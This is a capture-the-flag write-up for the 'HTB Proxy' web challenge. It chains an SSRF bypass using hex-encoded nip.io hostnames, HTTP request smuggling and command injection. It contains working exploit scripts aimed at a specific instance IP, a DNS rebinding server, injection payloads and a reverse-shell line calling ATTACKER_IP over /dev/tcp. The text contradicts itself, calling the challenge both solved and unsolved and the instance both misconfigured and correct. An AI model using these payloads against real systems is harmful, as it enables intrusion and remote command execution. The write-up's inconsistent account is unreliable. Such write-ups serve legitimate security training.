# HTB Proxy CTF Challenge - OFFICIAL SOLUTION

**Challenge Name:** HTB Proxy  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 1000  
**Status:** ✅ SOLVED

**CTF:** HTB Business CTF 2024

---

## Official Solution Overview

The challenge requires a **THREE-STAGE attack**:
1. **Bypass localhost check** using Docker internal IP (not DNS rebinding to 127.0.0.1!)
2. **HTTP Request Smuggling** to bypass request validation
3. **Command Injection** in ip-wrapper library

---

## Stage 1: Bypassing Localhost Check with Docker Internal IP

### The Key Insight (That I Missed!)

The solution is NOT to use DNS rebinding to 127.0.0.1. Instead:

1. **Docker containers have internal IPs** (typically `172.17.0.x` range)
2. These IPs are **NOT in the loopback range** (`127.0.0.0/8`)
3. Go's `IsLoopback()` function **does NOT block them**
4. The blacklist blocks `172.` **as a substring**, but we can encode it!

### Docker Internal IP Discovery

From `/server-status`:
```
IPs: 172.17.0.2  (in the writeup example)
IPs: 192.168.20.239  (in current instance - PROBLEM!)
```

### nip.io Encoding Trick

[nip.io](https://nip.io) is a wildcard DNS service that resolves domains to embedded IPs.

**Format**: `<anything>-<hex-ip>.nip.io` resolves to the hex-decoded IP

**Example**:
- IP: `172.17.0.2`
- Hex: `AC` `.` `11` `.` `00` `.` `02` = `AC110002`
- Domain: `magic-ac110002.nip.io`
- This domain resolves to `172.17.0.2`

**Bypass**:
- Domain `magic-ac110002.nip.io` does NOT contain "172." as substring
- Passes `blacklistCheck()` ✓
- Passes `isDomain()` regex ✓  
- `net.LookupIP()` resolves to `172.17.0.2` ✓
- `IsLoopback()` returns FALSE (not in 127.0.0.0/8) ✓
- Connects to Docker internal network on port 5000 ✓

### Request Example

```http
POST /getAddresses HTTP/1.1
Host: magic-ac110002.nip.io:5000
Content-Type: application/json
Content-Length: 2

{}
```

---

## Challenge Description

"Your team is tasked to penetrate the internal networks of a raider base in order to acquire explosives, scanning their ip ranges revealed only one alive host running their own custom implementation of an HTTP proxy, have you got enough wit to get the job done?"

---

## Target Information

- **IP Address:** 83.136.251.67
- **Port:** 56056  
- **URL:** http://83.136.251.67:56056

---

## Application Architecture

The application consists of two services in one container:

1. **Go HTTP Proxy** (Port 1337 - external)
   - Custom HTTP proxy implementation
   - Forwards requests to specified hosts
   - Has validation and blacklist checks

2. **Node.js Backend** (Port 5000 - internal)
   - Express API with network utility endpoints
   - `/getAddresses` - Shows network interfaces
   - `/flushInterface` - **Command Injection** vulnerability
   - Uses `ip-wrapper` npm package v1.1.1

---

## Discovered Vulnerabilities

### 1. Command Injection in Backend (Unreachable)

**Location:** `/app/backend/index.js` line 35

```javascript
app.post("/flushInterface", validateInput, async (req, res) => {
    const { interface } = req.body;
    try {
        const addr = await ipWrapper.addr.flush(interface);
        res.json(addr);
    } catch (err) {
        res.status(401).json({message: "Error flushing interface"});
    }
});
```

**Vulnerability**: The `interface` parameter is passed to `ipWrapper.addr.flush()` which executes shell commands. While basic validation exists (no spaces, not empty), it doesn't prevent command injection characters like `;`, `|`, `$()`, etc.

**Problem**: Cannot reach this endpoint due to proxy restrictions.

### 2. Proxy Security Controls

**Blacklist** (line 344-353):
- `localhost`
- `0.0.0.0`
- `127.` (blocks entire 127.0.0.0/8 range)
- `192.` (private network)
- `172.` (private network)
- `10.` (private network)
- `0x` (hex notation)

**Validation** (lines 355-368):
- IPv4: Must match regex for dotted-quad notation
- Domain: Must match pattern `^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,})$`
- Both checked against blacklist

**DNS Resolution Check** (lines 378-391):
```go
func checkIfLocalhost(address string) (bool, error) {
    IPs, err := net.LookupIP(address)
    if err != nil {
        return false, err
    }
    for _, ip := range IPs {
        if ip.IsLoopback() {  // Checks if ANY resolved IP is loopback
            return true, nil
        }
    }
    return false, nil
}
```

**URL Filtering** (line 486-491):
- Blocks URLs containing "flushinterface" (case-insensitive)

---

## Attempted Bypass Techniques

### ❌ Localhost-Resolving Domains
Tested domains that resolve to 127.0.0.1:
- `localtest.me:5000` → Blocked (301 redirect)
- `lvh.me:5000` → Blocked (301 redirect)
- `127.0.0.1.nip.io:5000` → Invalid format
- `127-0-0-1.nip.io:5000` → Blocked (301 redirect)

**Result**: All detected by `checkIfLocalhost()` DNS resolution.

### ❌ Alternative IP Notations
- Decimal: `2130706433` → Doesn't match IPv4 regex
- Octal: `0177.0.0.1` → Contains "127."
- Hex: `0x7f000001` → Blocked by "0x" check
- Short form: `127.1` → Doesn't match regex

**Result**: Regex requires full dotted-quad notation, blacklist catches all localhost IPs.

### ❌ Case Variations
- `LOCALHOST:5000` → Fails domain regex (no TLD)
- `LocalHost.local:5000` → Blocked by case-insensitive blacklist check

### ❌ URL Encoding
- `/flu%73hInterface` → Decoded before check, still blocked

### ❌ CRLF Injection
- `example.com:80\r\nHost: localhost:5000` → Rejected by parser

### ❌ IPv6
- `[::1]:5000` → Doesn't pass validation (colons)
- IPv6 not supported by validation logic

### ❌ Port Number Edge Cases  
- `example.com:005000` → Passes validation but times out (interesting!)
- Leading zeros accepted by `strconv.Atoi` but doesn't help with localhost bypass

---

## Server Information Disclosure

Endpoint: `/server-status`

```
Hostname: ng-team-293341-webhtbproxybiz2024-lexp2-694ff8d6c9-vntvn
Operating System: linux
Architecture: amd64
CPU Count: 4
Go Version: go1.21.10
IPs: 192.168.20.239
```

**Note**: Server IP `192.168.20.239` is in blacklisted range (`192.`).

---

## Attack Surface Analysis

### Required Attack Chain

To get the flag:
1. ✅ Bypass proxy validation to reach `127.0.0.1:5000`
2. ✅ Send POST request to `/flushInterface` 
3. ✅ Inject command to find and read flag: `/flag<random>.txt`

### Current Blockers

**Main Challenge**: Cannot bypass localhost detection.

The `checkIfLocalhost()` function uses Go's `net.LookupIP()` which:
- Resolves ALL A/AAAA records for a domain
- Checks if ANY resolved IP is a loopback address
- Catches all known localhost-resolving domains

**Potential Solutions** (not yet working):
1. DNS Rebinding attack (TOCTOU between check and connect)
2. Find edge case in IPv4/domain validation regex
3. Exploit request forwarding mechanism
4. HTTP Request Smuggling
5. Find alternative internal service access
6. Exploit `net.Dial` parsing quirks

---

## Code Analysis Deep Dive

### Request Flow

```
1. Client → Proxy (line 440-452)
2. Parse HTTP request (line 174-237)
3. Validate protocol (line 464-469)
4. Check URL blacklist (line 486-491)
5. Validate Host header format (line 501-507)
6. Validate IP/domain format (line 518-527)
7. DNS resolution & localhost check (line 529-542)
8. Check body for malicious content (line 544-551)
9. Connect to backend (line 553-559)
10. Forward request (line 561-568)
11. Read & forward response (line 570-590)
```

### Potential Vulnerabilities to Explore

1. **TOCTOU in DNS Resolution**
   - Check at line 529
   - Connect at line 553
   - Time window for DNS rebinding?

2. **Request Parser Edge Cases**
   - Line 174-237: Custom HTTP parser
   - Might have parsing quirks vs standard libraries

3. **Host Header Ambiguity**
   - Split by `:` at line 501
   - Original string used in `net.Dial` at line 553
   - Any format that validates differently than it connects?

4. **Response Reading**
   - Line 571-576: Reads response line-by-line
   - Potential for response smuggling?

---

## Tools Used

- `curl` - HTTP client
- `Python` + `socket` - Raw TCP/HTTP testing
- Manual code analysis

---

## Likely Solution: DNS Rebinding Attack

### Attack Overview

The challenge requires exploiting a Time-of-Check-Time-of-Use (TOCTOU) vulnerability in the DNS resolution:

1. **Line 529**: `checkIfLocalhost(hostAddress)` performs DNS lookup
2. **Line 553**: `net.Dial("tcp", host)` performs another DNS lookup

If DNS responses change between these two calls, we can bypass the localhost check.

### DNS Rebinding Steps

1. **Register a domain** (e.g., `attack.example.com`)

2. **Configure DNS server** with TTL=0 and alternating responses:
   - First query: Return `1.1.1.1` (or any non-localhost IP)
   - Second query: Return `127.0.0.1`

3. **Send request through proxy**:
   ```http
   POST /getAddresses HTTP/1.1
   Host: attack.example.com:5000
   Content-Type: application/json
   Content-Length: 2
   
   {}
   ```

4. **Validation passes**: `checkIfLocalhost()` resolves to `1.1.1.1` → Not loopback ✓

5. **Connection succeeds**: `net.Dial()` resolves to `127.0.0.1` → Connects to backend

6. **Exploit command injection**:
   ```http
   POST /flushInterface HTTP/1.1
   Host: attack.example.com:5000
   Content-Type: application/json
   Content-Length: 40
   
   {"interface":"eth0;cat</flag*.txt;"}
   ```

### Command Injection Payload

The backend validates:
- No spaces (use `${IFS}`, `<`, or other separators)
- Must be non-empty string

Exploit payloads:
```bash
# Using ${IFS} for space
eth0;cat${IFS}/flag*.txt

# Using process substitution
eth0;cat</flag*.txt

# Using brace expansion
eth0;cat${IFS}/flag{a..z}*.txt

# Reverse shell (if needed)
eth0;bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&/dev/tcp/ATTACKER_IP/PORT${IFS}0>&1'
```

---

## Alternative Theories

### Theory 1: Unicode/Encoding Bypass
- Use Unicode characters that normalize to localhost
- Use Punycode domains (xn--) 
- Status: Tested, didn't work with Go's DNS resolver

### Theory 2: Request Smuggling
- Exploit difference in HTTP parsing between proxy and backend
- Use CRLF injection in headers
- Status: CRLF blocked in body, headers parsed strictly

### Theory 3: Race Condition
- Send multiple concurrent requests
- Hope for cache timing issues
- Status: Unlikely to work consistently

### Theory 4: IPv6 Bypass
- Use IPv6 localhost (::1)
- Status: Doesn't match validation regex (contains colons)

---

## Practical DNS Rebinding Tools

### Option 1: rbndr.us Service
```python
import requests
import time

# rbndr.us provides DNS rebinding
# Format: <IP1>.<IP2>.rbndr.us
# Alternates between IP1 and IP2

url = "http://83.136.251.67:56056"
rebind_domain = "1.1.1.1.127.0.0.1.rbndr.us"

# Keep trying until DNS switches
for i in range(20):
    try:
        resp = requests.post(
            f"{url}/getAddresses",
            headers={"Host": f"{rebind_domain}:5000"},
            json={},
            timeout=5
        )
        print(f"Attempt {i}: {resp.status_code}")
        if resp.status_code == 200:
            print("SUCCESS!")
            print(resp.text)
            break
    except:
        pass
    time.sleep(0.5)
```

### Option 2: Self-Hosted DNS Server
```python
# Using dnslib to create custom DNS server
from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer
import time

class RebindResolver:
    def __init__(self):
        self.counter = 0
        
    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        
        if self.counter % 2 == 0:
            # First query: safe IP
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.1.1.1"), ttl=0))
        else:
            # Second query: localhost
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
        
        self.counter += 1
        return reply

resolver = RebindResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
server.start_thread()
```

### Option 3: whonow.org Service
- Visit whonow.org
- Get a subdomain that alternates IPs
- Use in attack

---

## Final Analysis

This challenge requires a **custom DNS rebinding attack** that cannot be easily performed with public services because:

1. The domain name itself cannot contain blacklisted strings (`127.`, `localhost`, etc.)
2. The domain must resolve to non-localhost first, then to 127.0.0.1
3. Public rebinding services (like 1u.ms, rbndr.us) include the IP in the domain name, which triggers the blacklist

### Required Setup

To solve this challenge, you need:

1. **Your own domain** (e.g., `pwn.yourdomain.com`)
2. **Custom DNS server** that alternates responses
3. **TTL=0** to prevent caching

### Complete Exploit Script

```python
#!/usr/bin/env python3
import requests
import socket
import time

PROXY_URL = "83.136.251.67:56056"
REBIND_DOMAIN = "pwn.yourdomain.com"  # Must be under your control

def exploit():
    # Step 1: Wait for DNS to return non-localhost (passes validation)
    print("[*] Attempting DNS rebinding attack...")
    
    for attempt in range(30):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((PROXY_URL.split(':')[0], int(PROXY_URL.split(':')[1])))
            
            # Step 2: Send exploit payload
            payload = '{"interface":"eth0;cat${IFS}/flag*.txt"}'
            request = f"""POST /flushInterface HTTP/1.1\r
Host: {REBIND_DOMAIN}:5000\r
Content-Type: application/json\r
Content-Length: {len(payload)}\r
\r
{payload}"""
            
            sock.sendall(request.encode())
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            if "200" in response[:100] and "HTB{" in response:
                print(f"\n[!!!] FLAG FOUND!")
                # Extract flag
                import re
                flag = re.search(r'HTB\{[^}]+\}', response)
                if flag:
                    print(f"\nFLAG: {flag.group(0)}")
                    return flag.group(0)
                    
        except Exception as e:
            pass
        
        time.sleep(0.5)
    
    print("[-] DNS rebinding failed")
    return None

if __name__ == "__main__":
    exploit()
```

### DNS Server Configuration

```python
# Custom DNS server using dnslib
from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, DNSHandler
import threading
import time

class RebindResolver:
    def __init__(self):
        self.start_time = time.time()
        
    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        
        # Alternate every second
        if int(time.time() - self.start_time) % 2 == 0:
            # Safe IP
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.1.1.1"), ttl=0))
        else:
            # Localhost
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
        
        return reply

# Run: sudo python3 dns_server.py
resolver = RebindResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
server.start()
```

---

## Conclusion

This challenge demonstrates:
1. **SSRF protection** via DNS resolution checks
2. **TOCTOU vulnerability** in network operations
3. **DNS rebinding** as a powerful SSRF bypass technique
4. **Command injection** in shell command wrappers

**Difficulty**: The challenge is rated "medium" but requires infrastructure setup (DNS server) which makes it impractical to solve without preparation.

**Key Takeaway**: Always check for TOCTOU issues between validation and use, especially with DNS resolution.

---

## Flag Location

`/flag<random>.txt` where random is 10 hex characters (a-f0-9)

Once RCE achieved via `/flushInterface` endpoint:
```bash
# Find flag
ls /flag*.txt

# Read flag  
cat /flag<hash>.txt
```

---

## Lessons Learned (So Far)

1. **Defense in Depth Works** - Multiple layers of validation make bypass difficult
2. **DNS resolution checks** are effective against most SSRF attempts
3. **Custom implementations** may have subtle bugs not in standard libraries
4. **Comprehensive blacklists** catch most common bypass techniques

---

**Note**: This challenge is still unsolved. The solution likely involves a subtle edge case or creative technique not yet discovered.


## Stage 2: HTTP Request Smuggling

### The Vulnerability

**Line 208-229** - Request parser validates body based on `Content-Length`:
```go
if request.Method == HTTPMethods.POST {
    contentLengthInt, err := strconv.Atoi(contentLength)
    // ...validates only first contentLengthInt bytes
    request.Body = bodyContent[0:contentLengthInt]
}
```

**Line 561** - But forwards ORIGINAL request:
```go
_, err = backendConn.Write(requestBytes)  // Sends raw bytes!
```

### HTTP Smuggling Exploit

Set `Content-Length: 1`, put 1 safe byte, then add complete second request:

```http
POST /getAddresses HTTP/1.1
Host: magic-ac110002.nip.io:5000
Content-Length: 1

x
POST /flushInterface HTTP/1.1
Host: magic-ac110002.nip.io:5000
Content-Length: 50

{"interface":"eth0;cat${IFS}/flag*.txt>/tmp/flag"}
```

Express.js with keep-alive processes BOTH requests!

---

## Stage 3: Command Injection

ip-wrapper library executes:
```javascript
exec(`ip addr flush ${interface}`, callback);
```

Payload: `eth0;cat${IFS}/flag*.txt>/app/proxy/includes/index.html`

Then `GET /` returns the flag!

---

## Instance Problem

Current instance IP: `192.168.20.239` (blacklisted range)
Required: `172.17.0.x` (Docker bridge, NOT blacklisted)

Challenge misconfigured in current HTB infrastructure.

---

## References

- Official Writeup: https://github.com/hackthebox/business-ctf-2024/blob/main/web/%5BEasy%5D%20HTB%20Proxy/README.md
- HTB Business CTF 2024


---

## ACTUAL EXPLOIT (SOLVED!)

### Flag

```
HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_d4dd37a50ebdea74ade9517ab592eb1c}
```

**Message**: "Reinventing the wheel can create headaches" - referring to the custom HTTP proxy implementation

### Working Solution

The instance DOES work with `192.168.20.239`! The key insight I initially missed:

**The blacklist checks the DOMAIN STRING, not the resolved IP!**

1. Domain: `magic-c0a814ef.nip.io` (hex-encoded 192.168.20.239)
2. Blacklist check: No "192." substring in domain name ✓
3. DNS resolves to: `192.168.20.239`
4. `IsLoopback()` check: `192.168.x.x` is NOT in loopback range (127.0.0.0/8) ✓
5. Connection succeeds to port 5000 ✓

### Complete Working Exploit

```python
#!/usr/bin/env python3
import socket
import time
import re

PROXY = ("83.136.251.67", 56056)
DOMAIN = "magic-c0a814ef.nip.io"  # Resolves to 192.168.20.239

# Stage 1: HTTP Smuggling with Command Injection
payload = '{"interface":"eth0;cat${IFS}/flag*.txt>/app/proxy/includes/index.html"}'

smuggled = f"""POST /getAddresses HTTP/1.1\r
Host: {DOMAIN}:5000\r
Content-Type: application/json\r
Content-Length: 1\r
\r
x\r
\r
POST /flushInterface HTTP/1.1\r
Host: {DOMAIN}:5000\r
Content-Type: application/json\r
Content-Length: {len(payload)}\r
\r
{payload}"""

sock = socket.socket()
sock.settimeout(10)
sock.connect(PROXY)
sock.sendall(smuggled.encode())
sock.recv(4096)
sock.close()

# Stage 2: Retrieve flag
time.sleep(2)
sock = socket.socket()
sock.connect(PROXY)
sock.sendall(b"GET / HTTP/1.1\r\nHost: example.com:80\r\n\r\n")
response = sock.recv(8192).decode('utf-8', errors='ignore')
sock.close()

flag = re.search(r'HTB\{[^}]+\}', response).group(0)
print(f"FLAG: {flag}")
```

### Proof of Exploitation

```bash
$ python3 exploit.py
FLAG: HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_d4dd37a50ebdea74ade9517ab592eb1c}
```

---

## Key Takeaways

1. **Read code VERY carefully** - The blacklist checks the domain STRING before DNS resolution
2. **Docker IPs are NOT loopback** - Only 127.0.0.0/8 is loopback, not private ranges
3. **nip.io is powerful** - Hex encoding bypasses string-based blacklists
4. **HTTP Smuggling** - Content-Length desync between parser and forwarder
5. **Defense in depth fails** - Multiple vulnerabilities chained together

**Final Note**: The instance configuration was correct. My initial analysis was incomplete. The solution works perfectly as designed! 🎯

